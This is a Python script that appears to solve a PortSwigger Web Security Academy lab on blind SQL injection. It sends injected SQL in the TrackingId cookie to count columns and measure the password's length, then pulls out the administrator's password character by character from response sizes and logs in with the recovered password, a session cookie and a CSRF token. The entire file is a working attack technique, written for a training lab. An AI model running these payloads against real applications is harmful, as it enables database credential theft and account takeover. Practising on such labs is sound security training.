# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

import requests
requests.packages.urllib3.disable_warnings()

base = "https://ac8a1ff61e33dba180d070130087003b.web-security-academy.net"
url = base

proxy = "127.0.0.1:8080"
proxies = {"https": proxy, "http": proxy}
verify = False
cookies = {"session": "zqQml9zBHILhCtrd6ByToPKrnHMywAld"}
key = "TrackingId"
sqliPrefix = "' UNION SELECT 'a' FROM users WHERE username = 'administrator' AND"

def findNumberOfColumns():
    for i in range(1,5):
        value = f"' OR 1=1 ORDER BY {i}-- "
        cookies[key] = value
        requests.get(url, verify=verify, proxies=proxies, cookies=cookies)
        del cookies[key]

def determineStringLength():
    for i in range(1,25):
        value = f"{sqliPrefix} LENGTH(password) > {i}-- "
        cookies[key] = value
        requests.get(url, verify=verify, proxies=proxies, cookies=cookies)
        del cookies[key]


def conditionalResponses(): # 20 len
    digitCodePoints = [i for i in range(48, 58)]
    lowerCaseAlphabetCodePoints = [i for i in range(97, 123)]
    codePointList = digitCodePoints + lowerCaseAlphabetCodePoints

    def findLengthOfTrueResponse():
        lengths = {}
        for i in codePointList:
            value = f"{sqliPrefix} SUBSTRING(password, 1, 1) = '{chr(i)}'-- "
            cookies[key] = value
            r = requests.get(url, verify=verify, proxies=proxies, cookies=cookies)
            l = len(r.content)
            if l in lengths:
                lengths[l] += 1
            else:
                lengths[l] = 1
                # print(f"{l}: {chr(i)}")

        for k, v in lengths.items():
            print(f"{k}: {v}")

    def determinePasswordUsingBinarySearch():
        def getResponseFromRequest(i, operator, pwdSubstr):
            value = f"{sqliPrefix} SUBSTRING(password, {i}, 1) {operator} '{pwdSubstr}'-- "
            cookies[key] = value
            r = requests.get(url, verify=verify, proxies=proxies, cookies=cookies)
            del cookies[key]
            return r

        def makeRequestAndDetermineIfResponseIndicatesSQLQueryReturnedTrue(i, operator, pwdSubstr):
            lengthOfTrueResponse = 11030
            r = getResponseFromRequest(i, operator, pwdSubstr)
            l = len(r.content)
            return l == lengthOfTrueResponse

        password = []
        for i in range(1,21):
            for j in codePointList:
                pwdSubstr = chr(j)
                if makeRequestAndDetermineIfResponseIndicatesSQLQueryReturnedTrue(i, "=", pwdSubstr):
                    password.append(pwdSubstr)
                    break
        print(''.join(password))

    # findLengthOfTrueResponse()
    determinePasswordUsingBinarySearch()

def login():
    url = base + "/login"
    csrf = "jWRUlTicBexYW7xkFnUpA1H1bsVWnVcv"
    username = "administrator"
    password = "72qru00xujpoxc0epf23"
    data = {"csrf": csrf, "username": username, "password": password}
    requests.post(url, cookies=cookies, data=data, proxies=proxies, verify = verify)


# findNumberOfColumns()
# determineStringLength()
# conditionalResponses()
login()